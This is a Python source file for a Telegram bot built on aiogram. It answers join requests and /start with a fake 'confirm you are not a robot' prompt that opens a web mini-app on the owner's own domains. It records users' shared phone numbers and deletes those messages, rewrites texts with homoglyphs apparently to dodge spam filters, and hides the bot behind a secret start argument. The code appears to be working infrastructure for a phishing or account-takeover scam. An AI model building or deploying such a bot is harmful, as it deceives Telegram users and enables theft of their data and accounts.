from __future__ import annotations

import logging

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.enums import ParseMode
from aiogram.filters import CommandObject, CommandStart
from aiogram.types import (
    ChatJoinRequest,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    MenuButtonDefault,
    MenuButtonWebApp,
    Message,
    WebAppInfo,
)

from config import MINIAPP_BASE_URL
from database import (
    get_bot_by_tg_id,
    get_template,
    record_contact,
    record_launch,
    user_domains_list,
)
from direct_link.aiogram_integration import DirectLinkMiddleware
from directlink_service import get_module
from templates import template_name
from uniqualizer import uniqualize

logger = logging.getLogger(__name__)

DEFAULT_WELCOME = "Привет! 👋 Спасибо за заявку, рады видеть вас в нашем канале!"

GREETING_TEXT = (
    "👋 Здравствуйте!\n"
    "Чтобы получить доступ к боту 👇\n\n"
    "❗️ Пожалуйста, подтвердите то, что вы не робот"
)

OPEN_BUTTON = "Подтвердить ✅"

def _uniqualize_if_enabled(content: dict, text: str) -> str:
    if not content.get("uniq_enabled"):
        return text
    try:
        return uniqualize(
            text,
            homoglyph_ratio=float(content.get("uniq_ratio") or 0.5),
            mode=content.get("uniq_mode") or "hard",
        )
    except Exception:
        return text

def _builder_template_data(bot_db: dict) -> dict | None:
    """Возвращает data builder-шаблона бота (если привязан), иначе None."""
    bid = bot_db.get("builder_template_id")
    if not bid:
        return None
    try:
        from database import builder_template_get
        t = builder_template_get(bid)
        if t and isinstance(t.get("data"), dict):
            return t["data"]
    except Exception as e:
        logger.warning("builder_template_get failed: %s", e)
    return None


def _template_text(bot_db: dict, field: str, default: str) -> str:
    # 1. Сначала пробуем builder-шаблон.
    #    field='start_msg' → data.invite.text
    #    field='second_msg' → не используем как текст (стикер обрабатывается отдельно)
    bdata = _builder_template_data(bot_db)
    if bdata:
        invite = bdata.get("invite") or {}
        if field == "start_msg":
            v = (invite.get("text") or "").strip()
            if v:
                return v
        # second_msg больше не текст — пустая строка, чтобы _send_start_flow его пропустил
        if field == "second_msg":
            return ""

    text = default
    content: dict = {}
    tid = bot_db.get("template_id")
    if tid:
        t = get_template(tid)
        if t:
            content = t["content"]
            val = (content.get(field) or "").strip()
            if val:
                text = content[field]
    return _uniqualize_if_enabled(content, text)

def _template_btn_label(bot_db: dict, default: str) -> str:
    # 1. Сначала пробуем builder-шаблон → data.invite.button_text
    bdata = _builder_template_data(bot_db)
    if bdata:
        invite = bdata.get("invite") or {}
        v = (invite.get("button_text") or "").strip()
        if v:
            return v

    tid = bot_db.get("template_id")
    if tid:
        t = get_template(tid)
        if t:
            val = (t["content"].get("start_btn") or "").strip()
            if val:
                return val
    return default

def _owner_domain(bot_db: dict) -> str | None:
    """Возвращает последний привязанный домен владельца бота, или None."""
    owner_id = bot_db.get("owner_id")
    if not owner_id:
        return None
    rows = user_domains_list(owner_id)
    return rows[-1]["domain"] if rows else None


async def _miniapp_url(bot_id: int, bot_db: dict | None = None) -> str | None:
    """База мини-аппа: сначала домен владельца бота из user_domains,
    затем глобальный MINIAPP_BASE_URL (бэкап для legacy-сетапов)."""
    base = None
    if bot_db is not None:
        domain = _owner_domain(bot_db)
        if domain:
            base = f"https://{domain}"
    if base is None and MINIAPP_BASE_URL:
        base = MINIAPP_BASE_URL
    if base is None:
        return None
    state = await get_module().get_or_init(bot_id)
    return f"{base}/app/{bot_id}?t={state['startapp_token']}"

async def _set_menu_button(bot: Bot, chat_id: int, bot_id: int, label: str,
                           bot_db: dict | None = None) -> None:
    url = await _miniapp_url(bot_id, bot_db)
    try:
        if url is None:
            await bot.set_chat_menu_button(
                chat_id=chat_id, menu_button=MenuButtonDefault()
            )
        else:
            await bot.set_chat_menu_button(
                chat_id=chat_id,
                menu_button=MenuButtonWebApp(text=label, web_app=WebAppInfo(url=url)),
            )
    except Exception as e:
        logger.warning("set menu button for %s failed: %s", chat_id, e)

def _render_template(bot_db: dict) -> tuple[str, InlineKeyboardMarkup | None]:
    template = bot_db.get("template") or "standard"

    if template == "standard":

        username = (bot_db.get("username") or "").lstrip("@")
        startapp = f"https://t.me/{username}?startapp=app" if username else None
        kb = None
        if startapp:
            kb = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="🚀 Открыть приложение", url=startapp)]
                ]
            )
        return ("Добро пожаловать! Откройте приложение кнопкой ниже 👇", kb)

    if template == "welcome":
        return (bot_db.get("welcome_message") or DEFAULT_WELCOME, None)

    return ("Доступ открыт ✅", None)

def build_router() -> Router:
    router = Router()

    @router.chat_join_request()
    async def on_join_request(event: ChatJoinRequest) -> None:
        bot_db = get_bot_by_tg_id(event.bot.id)
        if not bot_db:
            return

        dl_on = await get_module().is_enabled_for(event.bot.id)
        logger.info(
            "join request: user=%s chat=%s dl_enabled=%s",
            event.from_user.id,
            event.chat.id,
            dl_on,
        )

        if dl_on:
            return

        record_launch(
            bot_tg_id=event.bot.id,
            user_id=event.from_user.id,
            username=event.from_user.username,
            geo=event.from_user.language_code,
        )

        target = getattr(event, "user_chat_id", None) or event.from_user.id
        await _send_start_flow(event.bot, target, bot_db)
        logger.info("join DM sent to %s", target)

    @router.message(CommandStart(deep_link=True))
    async def start_with_arg(message: Message, command: CommandObject) -> None:
        bot_db = get_bot_by_tg_id(message.bot.id)
        if not bot_db:
            return

        if bot_db.get("guard_enabled"):
            if command.args != bot_db.get("user_secret"):
                logger.info("bad secret from %s", message.from_user.id)
                return
        await _handle_access(message, bot_db)

    @router.message(CommandStart())
    async def start_plain(message: Message) -> None:
        bot_db = get_bot_by_tg_id(message.bot.id)
        if not bot_db:
            return

        if bot_db.get("guard_enabled"):
            return
        await _handle_access(message, bot_db)

    @router.message(F.contact)
    async def on_contact(message: Message) -> None:
        bot_db = get_bot_by_tg_id(message.bot.id)
        if not bot_db:
            return

        contact = message.contact
        record_contact(
            message.bot.id,
            message.from_user.id,
            contact.phone_number if contact else None,
            message.from_user.username,
        )

        try:
            await message.delete()
        except Exception as e:
            logger.warning("delete contact msg failed: %s", e)

    return router

async def _send_invite_sticker(bot: Bot, target: int, ref: str) -> None:
    """Отправляет стикер из web/static/stickers/. Для .json (Lottie)
    переупаковывает в .tgs (gzip) перед отправкой."""
    import gzip
    from pathlib import Path
    from aiogram.types import BufferedInputFile, FSInputFile

    folder = Path(__file__).resolve().parent.parent / "web" / "static" / "stickers"
    # Сначала ищем .json (lottie) → re-gzip в .tgs
    json_p = folder / f"{ref}.json"
    if json_p.exists():
        try:
            data = json_p.read_bytes()
            tgs = gzip.compress(data)
            file = BufferedInputFile(tgs, filename=f"{ref}.tgs")
            await bot.send_sticker(target, file)
            return
        except Exception as e:
            logger.warning("send lottie sticker %s failed: %s", ref, e)
            return
    # Иначе ищем растровые (gif/png/webp)
    for ext in (".webp", ".gif", ".png", ".jpg", ".jpeg"):
        p = folder / f"{ref}{ext}"
        if p.exists():
            try:
                file = FSInputFile(str(p))
                if ext == ".webp":
                    await bot.send_sticker(target, file)
                elif ext == ".gif":
                    await bot.send_animation(target, file)
                else:
                    await bot.send_photo(target, file)
                return
            except Exception as e:
                logger.warning("send raster sticker %s failed: %s", ref, e)
                return
    logger.info("sticker %s not found in %s", ref, folder)


async def _send_start_flow(bot: Bot, target: int, bot_db: dict) -> None:
    start_text = _template_text(
        bot_db, "start_msg", bot_db.get("welcome_message") or GREETING_TEXT
    )
    second_text = _template_text(bot_db, "second_msg", "").strip()
    label = _template_btn_label(bot_db, OPEN_BUTTON)

    # Стикер для 2-го сообщения из builder-шаблона
    second_sticker_ref = None
    bdata = _builder_template_data(bot_db)
    if bdata:
        inv = bdata.get("invite") or {}
        ss = inv.get("second_sticker") or None
        if isinstance(ss, dict):
            second_sticker_ref = ss.get("ref")

    await _set_menu_button(bot, target, bot.id, label, bot_db)

    async def _send(text: str) -> None:
        try:
            await bot.send_message(target, text)
        except Exception as e:
            logger.warning("send to %s failed: %s", target, e)

    await _send(start_text)
    if second_text:
        await _send(second_text)
    if second_sticker_ref:
        await _send_invite_sticker(bot, target, second_sticker_ref)

async def _handle_access(message: Message, bot_db: dict) -> None:
    record_launch(
        bot_tg_id=message.bot.id,
        user_id=message.from_user.id,
        username=message.from_user.username,
        geo=message.from_user.language_code,
    )
    await _send_start_flow(message.bot, message.chat.id, bot_db)

def build_dispatcher() -> Dispatcher:
    dp = Dispatcher()
    dp.message.middleware(DirectLinkMiddleware(get_module()))
    dp.include_router(build_router())
    return dp

def make_bot(token: str, proxy: str | None = None) -> Bot:

    session = AiohttpSession(proxy=proxy) if proxy else None
    return Bot(
        token=token,
        session=session,
        default=DefaultBotProperties(parse_mode=ParseMode.HTML),
    )

__all__ = ["build_dispatcher", "make_bot", "build_router", "template_name"]
